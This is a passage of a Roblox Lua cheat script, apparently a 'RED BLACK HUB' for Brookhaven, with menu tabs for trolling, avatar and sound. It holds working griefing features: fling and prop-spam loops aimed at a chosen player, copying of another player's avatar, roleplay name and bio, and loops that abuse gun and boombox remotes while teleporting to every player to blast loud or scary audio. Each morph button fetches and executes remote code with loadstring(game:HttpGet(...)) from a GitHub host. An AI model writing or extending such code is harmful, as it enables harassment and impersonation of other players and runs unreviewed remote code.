                    local x, y, z = math.cos(angle1) * dist, math.sin(angle2) * dist, math.sin(angle1) * dist
                    hrp.AssemblyLinearVelocity = Vector3.new(0, 60, 0)
                    hrp.CFrame = CFrame.new(thrp.Position + Vector3.new(x, y, z)) * CFrame.Angles(angle1, angle2, angle1)
                end)
            end
        end
    })

    TabTroll:AddToggle({
        Name = "FLING BOAT",
        Default = false,
        Callback = function(state)
            ClearConnection("FLING BOAT")
            ClearConnection("FLING BOAT_CONN")

            if state then
                activeConnections["FLING BOAT"] = task.spawn(function()
                    local boat = SpawnAndSitBoat()
                    local angleOrbit = 0
                    local rotX, rotY, rotZ = 0, 0, 0

                    local conn
                    conn = RunService.Heartbeat:Connect(function()
                        local target = FindTarget(selectedPlayerName)
                        if not target or not target.Character or not target.Character:FindFirstChild("HumanoidRootPart") then return end

                        local hrp = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
                        local lhum = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
                        local thrp = target.Character.HumanoidRootPart

                        if not hrp or not lhum then return end

                        if not lhum.Sit then
                            ClearConnection("FLING BOAT")
                            ClearConnection("FLING BOAT_CONN")
                            return
                        end

                        angleOrbit = angleOrbit + 0.35
                        rotX = rotX + 40
                        rotY = rotY + 55
                        rotZ = rotZ + 25

                        local offsetX = math.cos(angleOrbit) * 30
                        local offsetZ = math.sin(angleOrbit) * 30
                        local targetPos = thrp.Position + Vector3.new(offsetX, 15, offsetZ)

                        local targetPart = (boat and (boat.PrimaryPart or boat:FindFirstChild("Body") or boat:FindFirstChildOfClass("BasePart"))) or hrp

                        targetPart.AssemblyLinearVelocity = Vector3.new(50000, 50000, 50000)
                        targetPart.AssemblyAngularVelocity = Vector3.new(50000, 50000, 50000)
                        targetPart.CFrame = CFrame.new(targetPos) 
                            * CFrame.Angles(math.rad(rotX), math.rad(rotY), math.rad(rotZ))
                    end)

                    activeConnections["FLING BOAT_CONN"] = conn
                end)
            else
                if LP.Character then
                    local lhum = LP.Character:FindFirstChildOfClass("Humanoid")
                    local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
                    if lhum then lhum.Sit = false end
                    if hrp then
                        hrp.AssemblyLinearVelocity = Vector3.zero
                        hrp.AssemblyAngularVelocity = Vector3.zero
                    end
                end
            end
        end
    })

    TabTroll:AddToggle({
        Name = "PROP SPAM",
        Default = false,
        Callback = function(state)
            ClearConnection("PROP SPAM")
            if state then
                activeConnections["PROP SPAM"] = task.spawn(function()
                    while true do
                        local target = FindTarget(selectedPlayerName)
                        if target and target.Character and target.Character:FindFirstChild("HumanoidRootPart") then
                            local currentTarget = FindTarget(selectedPlayerName)
                            if currentTarget and currentTarget.Character and currentTarget.Character:FindFirstChild("HumanoidRootPart") then
                                local playerPos = currentTarget.Character.HumanoidRootPart.Position
                                
                                local char = LP.Character
                                if char and char:FindFirstChild("PropMaker") and char.PropMaker:FindFirstChild("Tool_PropMake") then
                                    local argsProp = {
                                        [1] = workspace.Model.Wedge,
                                        [2] = playerPos
                                    }
                                    char.PropMaker.Tool_PropMake:FireServer(unpack(argsProp))
                                end
                            end
                        end
                        task.wait(0.8)
                    end
                end)
            end
        end
    })
end

-- ==========================================
-- TAB AVATAR
-- ==========================================
local TabAvatar = Window:MakeTab({"AVATAR", "shirt"})

-- ================= SERVICES =================
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Remotes = ReplicatedStorage:WaitForChild("Remotes")

local TargetName = nil

-- ================= TEXTBOX =================
TabAvatar:AddTextBox({
    Name = "TARGET NAME",
    Description = "Enter target player name",
    PlaceholderText = "Username or Display...",
    Callback = function(Value)
        TargetName = Value
    end
})

-- ================= FUNÇÃO PARA ACHAR PLAYER =================
local function FindTarget(name)
    name = name:lower()
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr.Name:lower():find(name) or plr.DisplayName:lower():find(name) then
            return plr
        end
    end
    return nil
end

-- ================= COPY AVATAR =================
TabAvatar:AddButton({"COPY AVATAR", function()
    if not TargetName then return end

    local TPlayer = FindTarget(TargetName)
    if not TPlayer or not TPlayer.Character then return end

    local LP = Players.LocalPlayer
    local LChar = LP.Character
    if not LChar then return end

    local LHumanoid = LChar:FindFirstChildOfClass("Humanoid")
    local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")
    if not (LHumanoid and THumanoid) then return end

    -- RESET LOCAL
    local LDesc = LHumanoid:GetAppliedDescription()
    for _, acc in ipairs(LDesc:GetAccessories(true)) do
        if tonumber(acc.AssetId) then
            Remotes.Wear:InvokeServer(acc.AssetId)
            task.wait(0.2)
        end
    end
    for _, id in ipairs({LDesc.Shirt, LDesc.Pants, LDesc.Face}) do
        if tonumber(id) then
            Remotes.Wear:InvokeServer(id)
            task.wait(0.2)
        end
    end

    -- COPY TARGET
    local PDesc = THumanoid:GetAppliedDescription()
    Remotes.ChangeCharacterBody:InvokeServer({
        PDesc.Torso,
        PDesc.RightArm,
        PDesc.LeftArm,
        PDesc.RightLeg,
        PDesc.LeftLeg,
        PDesc.Head
    })

    task.wait(0.5)

    for _, id in ipairs({PDesc.Shirt, PDesc.Pants, PDesc.Face}) do
        if tonumber(id) then
            Remotes.Wear:InvokeServer(id)
            task.wait(0.3)
        end
    end

    for _, acc in ipairs(PDesc:GetAccessories(true)) do
        if tonumber(acc.AssetId) then
            Remotes.Wear:InvokeServer(acc.AssetId)
            task.wait(0.3)
        end
    end

    local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")
    if SkinColor then
        Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))
    end

    if tonumber(PDesc.IdleAnimation) then
        Remotes.Wear:InvokeServer(PDesc.IdleAnimation)
    end

    -- BIO / CORES
    local Bag = TPlayer:FindFirstChild("PlayersBag")
    if Bag then
        if Bag:FindFirstChild("RPName") and Bag.RPName.Value ~= "" then
            Remotes.RPNameText:FireServer("RolePlayName", Bag.RPName.Value)
        end
        if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value ~= "" then
            Remotes.RPNameText:FireServer("RolePlayBio", Bag.RPBio.Value)
        end
        if Bag:FindFirstChild("RPNameColor") then
            Remotes.RPNameColor:FireServer("PickingRPNameColor", Bag.RPNameColor.Value)
        end
        if Bag:FindFirstChild("RPBioColor") then
            Remotes.RPNameColor:FireServer("PickingRPBioColor", Bag.RPBioColor.Value)
        end
    end
end})

-- ================= HSV RGB COMPLETO =================

local RBW_Name = false
local RBW_Bio = false
local RBW_Body = false
local RBW_Speed = 1

TabAvatar:AddSection({"HSV RGB"})

TabAvatar:AddToggle({
	Name = "NAME RGB (HSV)",
	Default = false,
	Callback = function(v)
		RBW_Name = v
	end
})

TabAvatar:AddToggle({
	Name = "BIO RGB (HSV)",
	Default = false,
	Callback = function(v)
		RBW_Bio = v
	end
})

TabAvatar:AddToggle({
	Name = "BODY RGB (HSV)",
	Default = false,
	Callback = function(v)
		RBW_Body = v
	end
})

TabAvatar:AddTextBox({
	Name = "RGB SPEED",
	Description = "Adjust rainbow cycle speed",
	PlaceholderText = "1",
	Callback = function(v)
		local n = tonumber(v)
		if n and n > 0 then
			RBW_Speed = n
		end
	end
})

task.spawn(function()
	local hue = 0

	while true do
		task.wait(0.05)

		if RBW_Body or RBW_Name or RBW_Bio then
			hue = (hue + 0.01 * RBW_Speed) % 1

			local color = Color3.fromHSV(hue, 1, 1)
			local brick = BrickColor.new(color)

			if RBW_Body then
				Remotes.ChangeBodyColor:FireServer(brick.Name)
			end

			if RBW_Name then
				game:GetService("ReplicatedStorage")
					.RE["1RPNam1eColo1r"]
					:FireServer("PickingRPNameColor", color)
			end

			if RBW_Bio then
				game:GetService("ReplicatedStorage")
					.RE["1RPNam1eColo1r"]
					:FireServer("PickingRPBioColor", color)
			end
		end
	end
end)

-- =========================================================
-- RED BLACK WHITE RGB
-- =========================================================
local RBW_Colors = {
	Color3.fromRGB(255, 0, 0),
	Color3.fromRGB(0, 0, 0),
	Color3.fromRGB(255, 255, 255)
}

local RBW_Name = false
local RBW_Bio = false
local RBW_Body = false
local RBW_Speed = 0.7

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RE = ReplicatedStorage:WaitForChild("RE")
local ColorRemote = RE:WaitForChild("1RPNam1eColo1r")

TabAvatar:AddSection({"RED BLACK RGB"})

TabAvatar:AddToggle({
	Name = "NAME RGB (RBW)",
	Default = false,
	Callback = function(v) RBW_Name = v end
})

TabAvatar:AddToggle({
	Name = "BIO RGB (RBW)",
	Default = false,
	Callback = function(v) RBW_Bio = v end
})

TabAvatar:AddToggle({
	Name = "BODY RGB (RBW)",
	Default = false,
	Callback = function(v) RBW_Body = v end
})

TabAvatar:AddTextBox({
	Name = "RGB SPEED (RBW)",
	Description = "Set the color shifting delay interval",
	PlaceholderText = tostring(RBW_Speed),
	Callback = function(v)
		local n = tonumber(v)
		if n and n > 0.05 then
			RBW_Speed = n
		end
	end
})

task.spawn(function()
	local i = 1
	while true do
		task.wait(RBW_Speed)
		
		if RBW_Name or RBW_Bio or RBW_Body then
			i = i % #RBW_Colors + 1
			local currentColor = RBW_Colors[i]
			
			-- Altera a cor do Nome no RP do Brookhaven
			if RBW_Name then
				pcall(function()
					ColorRemote:FireServer("PickingRPNameColor", currentColor)
				end)
			end
			
			-- Altera a cor da Bio no RP do Brookhaven
			if RBW_Bio then
				pcall(function()
					ColorRemote:FireServer("PickingRPBioColor", currentColor)
				end)
			end
			
			-- Altera a cor da skin do personagem
			if RBW_Body then
				pcall(function()
					local brick = BrickColor.new(currentColor)
					Remotes.ChangeBodyColor:FireServer(brick.Name)
				end)
			end
		end
	end
end)

-- ================= RP NAMES =================
local RoleplayNames = {
	{"ANONYMOUS"," ANONYMOUS "},
	{"PRO PLAYER"," PRO PLAYER "},
	{"ERROR 666"," ERROR 666 "},
	{"GHOST"," GHOST "},
	{"JOKER"," JOKER "},
	{"ADMIN"," ADMIN "},
	{"TUBERS 93"," TUBERS 93 "},
	{"RED BLACK MEMBER"," RED BLACK MEMBER "},
	{"RED BLACK COMMUNITY"," RED BLACK COMMUNITY "},
	{"ADMIN RED BLACK"}
}

local selectedRP = nil

TabAvatar:AddSection({"RP Names"})

TabAvatar:AddDropdown({
	Name = "SELECT RP NAME",
	Description = "Choose an identity",
	Options = (function()
		local list = {}
		for _, v in ipairs(RoleplayNames) do
			table.insert(list, v[1])
		end
		return list
	end)(),
	Default = RoleplayNames[1][1],
	Callback = function(value)
		for _, v in ipairs(RoleplayNames) do
			if v[1] == value then
				selectedRP = v[2]
			end
		end
	end
})

TabAvatar:AddButton({"APPLY RP NAME", function()
	if not selectedRP then return end
	game:GetService("ReplicatedStorage").RE["1RPNam1eTex1t"]:FireServer("RolePlayName", selectedRP)
end})

-- ================= CLOTHES =================
TabAvatar:AddSection({"Clothes"})

TabAvatar:AddButton({"RED BLACK COMMUNITY SHIRT", function()
	Remotes.WearShirt:InvokeServer(101480394255855)
end})

TabAvatar:AddButton({"RED BLACK COMMUNITY PANTS", function()
	Remotes.WearPants:InvokeServer(124684324540170)
end})

-- ================= ITENS =================
TabAvatar:AddSection({"Itens"})

TabAvatar:AddButton({"SCARY HEAD", function()
	Remotes.Wear:InvokeServer(14994946752)
end})

TabAvatar:AddButton({"SCARY BRO 1", function()
	Remotes.Wear:InvokeServer(98235263954323)
end})

TabAvatar:AddButton({"SCARY BRO 2", function()
	Remotes.Wear:InvokeServer(87859729921468)
end})

TabAvatar:AddSection({"Morphs"})

local SELECTED_MORPH = nil

TabAvatar:AddDropdown({
    Name = "SELECT MORPH",
    Description = "Choose a morph to transform into",
    Options = {
        "SCP 096",
        "SID",
        "WORM BRO",
        "TUNG TUNG TUNG SAHUR",
        "BIG GUY",
        "DOJE",
        "BROWN CHICKEN",
        "GIGA CHAD",
        "KAWASAKI",
        "MIKE WAZOWSKI",
        "MONKEY",
        "PIGEON"
    },
    Default = "",
    Callback = function(Value)
        SELECTED_MORPH = Value
    end
})

TabAvatar:AddButton({"EQUIP", function()
    if not SELECTED_MORPH then return end

    if SELECTED_MORPH == "SCP 096" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/SCP%20096"))()

    elseif SELECTED_MORPH == "SID" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/SID"))()

    elseif SELECTED_MORPH == "WORM BRO" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/WORM%20BRO"))()

    elseif SELECTED_MORPH == "TUNG TUNG TUNG SAHUR" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/main/TUNG%20TUNG%20TUNG%20SAHUR"))()

    elseif SELECTED_MORPH == "BIG GUY" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/BIG%20GUY"))()

    elseif SELECTED_MORPH == "DOJE" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/DOJE"))()

    elseif SELECTED_MORPH == "BROWN CHICKEN" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/GALINHA"))()

    elseif SELECTED_MORPH == "GIGA CHAD" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/GIGA%20CHAD"))()

    elseif SELECTED_MORPH == "KAWASAKI" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/KAVAZAKI"))()

    elseif SELECTED_MORPH == "MIKE WAZOWSKI" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/MAIKI"))()

    elseif SELECTED_MORPH == "MONKEY" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/MONKEY"))()

    elseif SELECTED_MORPH == "PIGEON" then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/THEMRREDBLACK/RED-BLACK-HUB-BROOCKHAVEN-Lg/refs/heads/main/PINGEON"))()
    end
end})

-- ================= SPECIAL ITEMS =================
do
	local SectionSpecial = TabAvatar:AddSection({"Legs & Heads"})

	local function EquipItemDirect(ids)
		if not LP or not LP.Character or not Remotes then return end
		pcall(function()
			for _, id in ipairs(ids) do
				Remotes.Wear:InvokeServer(id)
				task.wait(0.15)
			end
		end)
	end

	-- ICE LEG
	TabAvatar:AddButton({"ICE LEG", function()
		EquipItemDirect({139572789})
	end})

	-- HEADLESS
	TabAvatar:AddButton({"HEADLESS", function()
		local headlessId = 15093053680
		if headlessId ~= 0 then
			EquipItemDirect({headlessId})
		end
	end})

	-- ZOMBIE LEG
	TabAvatar:AddButton({"ZOMBIE LEG", function()
		EquipItemDirect({86681341524412})
	end})
end

-- ================= ACCESSORIES =================
do
	local SectionAccessories = TabAvatar:AddSection({"ACCESSORIES"})

	local function EquipAccessory(ids)
		if not LP or not LP.Character or not Remotes then return end
		pcall(function()
			for _, id in ipairs(ids) do
				Remotes.Wear:InvokeServer(id)
				task.wait(0.15)
			end
		end)
	end

	-- DOMINUS FRIGIDUS
	TabAvatar:AddButton({"DOMINUS FRIGIDUS", function()
		EquipAccessory({48545806})
	end})

	-- DOMINUS PRAEFECTUS
	TabAvatar:AddButton({"DOMINUS PRAEFECTUS", function()
		EquipAccessory({527365852})
	end})

	-- DOMINUS MESSOR
	TabAvatar:AddButton({"DOMINUS MESSOR", function()
		EquipAccessory({64444871})
	end})

	-- DOMINUS VESPERTILIO
	TabAvatar:AddButton({"DOMINUS VESPERTILIO", function()
		EquipAccessory({96103379})
	end})

	-- DOMINUS REX
	TabAvatar:AddButton({"DOMINUS REX", function()
		EquipAccessory({250395631})
	end})

	-- DOMINUS EMPYREUS FVM
	TabAvatar:AddButton({"DOMINUS EMPYREUS FVM", function()
		EquipAccessory({151789690})
	end})

	-- DOMINUS INFERNUS
	TabAvatar:AddButton({"DOMINUS INFERNUS", function()
		EquipAccessory({31101391})
	end})

	-- PIRATE CAPTAIN HAT
	TabAvatar:AddButton({"PIRATE CAPTAIN HAT", function()
		EquipAccessory({1028859})
	end})

	-- P SINISTER
	TabAvatar:AddButton({"P SINISTER", function()
		EquipAccessory({17450053})
	end})

	-- RIDDLE SKULL
	TabAvatar:AddButton({"RIDDLE SKULL", function()
		EquipAccessory({4765718})
	end})

	-- MAD COW
	TabAvatar:AddButton({"MAD COW", function()
		EquipAccessory({14673292})
	end})

	-- CLOCKWORK FVM
	TabAvatar:AddButton({"CLOCKWORK FVM", function()
		EquipAccessory({232492903})
	end})

	-- THE EARTH
	TabAvatar:AddButton({"THE EARTH", function()
		EquipAccessory({10072631})
	end})
end

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local LP = Players.LocalPlayer
local RE = ReplicatedStorage:WaitForChild("RE")

local SoundIdValue = ""
local SelectedDropdownAudio = ""

local LoopTextboxEnabled = false
local LoopDropdownEnabled = false
local AudioAllActive = false

local BoomboxRGBEnabled = false
local BoomboxRGBSpeed = 0.5

local PresetAudios = {
    ["GET OUT"] = "17580996350",
    ["WINDOWS NOTIF"] = "2389339814",
    ["LOUD"] = "108451658708095",
    ["DIE FORTNITE"] = "72536455880966",
    ["REAL LOUD"] = "131682359704129",
    ["LIE DETECTOR"] = "117916446144888",
    ["NUKE ALARM"] = "433848566",
    ["LOOP BEEP SOUND"] = "6486261822",
    ["SCARY SOUND"] = "6516011433",
    ["SCARY SREAM"] = "111272255398192",
    ["SUS SCREAM"] = "76571808089308",
    ["NECK HURTS"] = "90409807315293",
    ["CHIKEN SCREAM"] = "81891427788694",
    ["VDSMA CARLINHOS"] = "135212564271817"
}

local DropdownOptions = {
    "GET OUT",
    "WINDOWS NOTIF",
    "LOUD",
    "DIE FORTNITE",
    "REAL LOUD",
    "LIE DETECTOR",
    "NUKE ALARM",
    "LOOP BEEP SOUND",
    "SCARY SOUND",
    "SCARY SREAM",
    "SUS SCREAM",
    "NECK HURTS",
    "CHIKEN SCREAM",
    "VDSMA CARLINHOS"
}

local function playLocalClientSound(audioId)
    task.spawn(function()
        local character = LP.Character
        if not character then return end
        local head = character:FindFirstChild("Head")
        if not head then return end
        
        local cleanID = tostring(audioId):gsub("%D", "")
        
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://" .. cleanID
        sound.Volume = 2
        sound.Parent = head
        sound:Play()
        
        sound.Ended:Connect(function()
            sound:Destroy()
        end)
        
        task.wait(10)
        if sound and sound.Parent then sound:Destroy() end
    end)
end

local function fireShotgunRemote(audioId)
    local character = LP.Character
    if not character then return end
    
    local shotgun = character:FindFirstChild("Shotgun") or LP.Backpack:FindFirstChild("Shotgun")
    if not shotgun then return end
    
    local handle = shotgun:FindFirstChild("Handle")
    local gunScript = shotgun:FindFirstChild("GunScript_Local")
    if not handle or not gunScript then return end
    
    local muzzle = gunScript:FindFirstChild("MuzzleEffect")
    local hitEffect = gunScript:FindFirstChild("HitEffect")
    if not muzzle or not hitEffect then return end

    local cleanID = tostring(audioId):gsub("%D", "")
    local targetAudioID = tonumber(cleanID)
    if not targetAudioID then return end

    local args = {
        workspace:WaitForChild("Model"):WaitForChild("MeshPart"),
        handle,
        vector.create(-2.700000047683716, 0.125, 0),
        vector.create(332.68603515625, 31, 400.6531982421875),
        muzzle,
        hitEffect,
        targetAudioID,
        140181997495870,
        { false },
        {
            25,
            vector.create(0.25, 0.25, 100),
            BrickColor.new(24),
            0.25,
            Enum.Material.SmoothPlastic,
            0.25
        },
        true,
        false
    }

    playLocalClientSound(targetAudioID)

    pcall(function()
        RE:WaitForChild("1Gu1n"):FireServer(unpack(args))
    end)
end

local function runAudioAllSystem(audioIdToPlay)
    if AudioAllActive then return end
    local character = LP.Character
    if not character then return end
    local rootPart = character:FindFirstChild("HumanoidRootPart")
    if not rootPart then return end

    AudioAllActive = true
    local originalCFrame = rootPart.CFrame

    local disabledSeats = {}
    for _, seat in ipairs(workspace:GetDescendants()) do
        if seat:IsA("Seat") or seat:IsA("VehicleSeat") then
            if seat.Disabled == false then
                seat.Disabled = true
                table.insert(disabledSeats, seat)
            end
        end
    end

    local noclipConnection
    noclipConnection = RunService.Stepped:Connect(function()
        if LP.Character then
            for _, part in ipairs(LP.Character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end)

    local targets = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            table.insert(targets, p)
        end
    end

    for _, target in ipairs(targets) do
        local targetChar = target.Character
        local targetRoot = targetChar and targetChar:FindFirstChild("HumanoidRootPart")
        
        if targetRoot then
            fireShotgunRemote(audioIdToPlay)

            local startTime = os.clock()
            while os.clock() - startTime < 1 do
                if targetRoot and rootPart and LP.Character then
                    rootPart.CFrame = targetRoot.CFrame * CFrame.new(0, 0, 2)
                end
                RunService.Heartbeat:Wait()
            end
        end
    end

    if noclipConnection then noclipConnection:Disconnect() end
    
    for _, seat in ipairs(disabledSeats) do
        if seat and seat.Parent then
            seat.Disabled = false
        end
    end

    if LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") then
        LP.Character.HumanoidRootPart.CFrame = originalCFrame
    end
    
    AudioAllActive = false
end

task.spawn(function()
    while true do
        task.wait(0.1)
        if LoopTextboxEnabled and SoundIdValue ~= "" then
            fireShotgunRemote(SoundIdValue)
            task.wait(0.4)
        end
        if LoopDropdownEnabled and SelectedDropdownAudio ~= "" then
            local id = PresetAudios[SelectedDropdownAudio]
            if id then
                fireShotgunRemote(id)
                task.wait(0.4)
            end
        end
    end
end)

local BoomboxColors = {
    Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 0, 255),
    Color3.fromRGB(255, 255, 0), Color3.fromRGB(255, 0, 255), Color3.fromRGB(0, 255, 255),
    Color3.fromRGB(255, 165, 0), Color3.fromRGB(128, 0, 128), Color3.fromRGB(255, 20, 147),
    Color3.fromRGB(139, 69, 19), Color3.fromRGB(75, 0, 130), Color3.fromRGB(0, 128, 128),
    Color3.fromRGB(192, 192, 192), Color3.fromRGB(255, 255, 255)
}

task.spawn(function()
    while true do
        task.wait(BoomboxRGBSpeed)
        if BoomboxRGBEnabled then
            local color = BoomboxColors[math.random(#BoomboxColors)]
            pcall(function()
                LP:WaitForChild("PlayerGui")
                    :WaitForChild("ToolGui")
                    :WaitForChild("ToolSettings")
                    :WaitForChild("Settings")
                    :WaitForChild("PropsColor")
                    :WaitForChild("SetColor")
                    :FireServer(color)
            end)
        end
    end
end)

local TabSound = Window:MakeTab({"SOUND FE", "volume-2"})

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RE = ReplicatedStorage:WaitForChild("RE")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local SoundIdValue = ""
local SelectedDropdownAudio = "GET OUT"

local LoopTextboxEnabled = false
local LoopDropdownEnabled = false

local TextboxCooldownValue = 0.2
local DropdownCooldownValue = 0.2

local function fireSniperRemote(audioId)
    local character = LocalPlayer.Character
    if not character then return end
    
    local sniper = character:FindFirstChild("Sniper")
    if not sniper then return end

    local handle = sniper:FindFirstChild("Handle")
    local gunScript = sniper:FindFirstChild("GunScript_Local")
    
    if handle and gunScript then
        local muzzleEffect = gunScript:FindFirstChild("MuzzleEffect")
        local hitEffect = gunScript:FindFirstChild("HitEffect")
        
        local cleanAudioId = tonumber(audioId) or audioId
        
        local args = {
            workspace:WaitForChild("Model"):WaitForChild("001_SpawnColor"):WaitForChild("Color2"),
            handle,
            Vector3.new(0, 0.42500001192092896, -3.299999952316284),
            Vector3.new(-3.630251884460449, 0.40000152587890625, -10.42583179473877),
            muzzleEffect,
            hitEffect,
            cleanAudioId,
            140181997495870,
            { false },
            {
                25,
                Vector3.new(0.25, 0.25, 100),
                BrickColor.new(24),
                0.25,
                Enum.Material.SmoothPlastic,
                0.25
            },
            true,
            false
        }
        
        pcall(function()
            RE:WaitForChild("1Gu1n"):FireServer(unpack(args))
        end)
        
        task.spawn(function()
            pcall(function()
                local localSound = Instance.new("Sound")
                localSound.SoundId = "rbxassetid://" .. tostring(audioId)
                localSound.Volume = 5
                localSound.Parent = handle
                localSound:Play()
                task.wait(2)
                localSound:Destroy()
            end)
        end)
    end
end

local function runAudioAllSystem(audioId)
    if not audioId or audioId == "" then return end
    
    local character = LocalPlayer.Character
    if not character then return end
    
    local originalCFrame = character:GetPivot()
    
    pcall(function()
        for _, desc in ipairs(workspace:GetDescendants()) do
            if desc:IsA("Seat") or desc:IsA("VehicleSeat") then
                desc:Destroy()
            end
        end
    end)
    
    local noclipConnection
    noclipConnection = RunService.Stepped:Connect(function()
        if character then
            for _, part in ipairs(character:GetDescendants()) do
                if part:IsA("BasePart") then
                    part.CanCollide = false
                end
            end
        end
    end)
    
    task.spawn(function()
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local targetRoot = player.Character.HumanoidRootPart
                local startTime = os.clock()
                
                fireSniperRemote(audioId)
                
                while os.clock() - startTime < 1.5 and targetRoot and targetRoot.Parent and character and character.Parent do
                    pcall(function()
                        character:PivotTo(targetRoot.CFrame)
                    end)
                    RunService.Heartbeat:Wait()
                end
            end
        end
        
        if noclipConnection then noclipConnection:Disconnect() end
        if character then
            character:PivotTo(originalCFrame)
        end
    end)
end

TabSound:AddSection({"Required Tools"})

TabSound:AddButton({"GET SNIPER", function()
    task.spawn(function()
        pcall(function()
            RE:WaitForChild("1Too1l"):InvokeServer("PickingTools", "Sniper")
        end)
    end)
end})

TabSound:AddButton({"GET BOOMBOX", function()
    task.spawn(function()
        pcall(function()
            RE:WaitForChild("1Too1l"):InvokeServer("PickingTools", "Boombox")
        end)
    end)
end})

TabSound:AddSection({"Boombox / FE Sound"})

TabSound:AddTextBox({
    Name = "SOUND ID",
    Description = "Enter audio asset ID",
    PlaceholderText = "Audio ID...",
    Callback = function(value)
        SoundIdValue = tostring(value)
    end
})

TabSound:AddButton({"PLAY SOUND", function()
    if SoundIdValue == "" then return end

    task.spawn(function()
        pcall(function()
            RE:WaitForChild("PlayerToolEvent"):FireServer(
                "ToolMusicText",
                SoundIdValue,
                nil,
                true
            )
        end)
    end)
end})

TabSound:AddToggle({
    Name = "RGB BOOMBOX",
    Default = false,
    Callback = function(state)
        BoomboxRGBEnabled = state
    end
})

TabSound:AddTextBox({
    Name = "RGB SPEED (SECONDS)",
    Description = "Adjust color changing interval",
    PlaceholderText = "0.5",
    Callback = function(value)
        local v = tonumber(value)
        if v and v > 0.05 then
            BoomboxRGBSpeed = v
        end
    end
})

TabSound:AddParagraph({"WARNING", "To play sounds using the Boombox, you must own the Sound Game Pass. You can also temporarily access it by watching an advertisement, which grants the Sound Game Pass for 10 minutes."})

TabSound:AddSection({"Custom FE Sound"})

TabSound:AddParagraph({"SNIPER REQUIREMENT WARNING", "You must have the Sniper equipped in your hand for the sounds to work. If it stays in your backpack, nothing will happen."})

TabSound:AddTextBox({
    Name = "SOUND ID",
    Description = "Enter custom audio asset ID",
    PlaceholderText = "Audio ID...",
    Callback = function(value)
        SoundIdValue = tostring(value)
    end
})

TabSound:AddButton({"PLAY SOUND", function()
    if SoundIdValue ~= "" then
        fireSniperRemote(SoundIdValue)
    end
end})

TabSound:AddTextBox({
    Name = "LOOP COOLDOWN",
    Description = "Set cooldown interval in seconds",
    PlaceholderText = "0.2",
    Callback = function(value)
        local num = tonumber(value)
        if num and num >= 0 then
            textboxCooldownValue = num 
        end
    end
})

TabSound:AddToggle({
    Name = "LOOP SOUND",
    Default = false,
    Callback = function(state)
        LoopTextboxEnabled = state
        if LoopTextboxEnabled then
            task.spawn(function()
                if not textboxCooldownValue then 
                    textboxCooldownValue = 0.2 
                end
                
                while LoopTextboxEnabled and SoundIdValue ~= "" do
                    fireSniperRemote(SoundIdValue)
                    task.wait(textboxCooldownValue)
                end
            end)
        end
    end
})

TabSound:AddButton({"AUDIO ALL", function()
    if SoundIdValue ~= "" then
        runAudioAllSystem(SoundIdValue)
    end
end})

TabSound:AddSection({"Preset FE Sounds"})

TabSound:AddDropdown({
    Name = "SELECT PRESET AUDIO",
    Description = "Choose a preset sound effect",
    Options = DropdownOptions,
    Default = "GET OUT",
    Callback = function(selected)
        SelectedDropdownAudio = selected
    end
})

TabSound:AddButton({"PLAY PRESET SOUND", function()
    if SelectedDropdownAudio ~= "" then
        local id = PresetAudios[SelectedDropdownAudio]
        if id then fireSniperRemote(id) end
    end
end})

TabSound:AddTextBox({
    Name = "PRESET LOOP COOLDOWN",
    Description = "Set cooldown interval in seconds",
    PlaceholderText = "0.2",
    Callback = function(value)
        local num = tonumber(value)
        if num and num >= 0 then
            DropdownCooldownValue = num
        end
    end
})

TabSound:AddToggle({
    Name = "LOOP PRESET SOUND",
    Default = false,
    Callback = function(state)
        LoopDropdownEnabled = state
        if LoopDropdownEnabled then
            task.spawn(function()
                while LoopDropdownEnabled and SelectedDropdownAudio ~= "" do
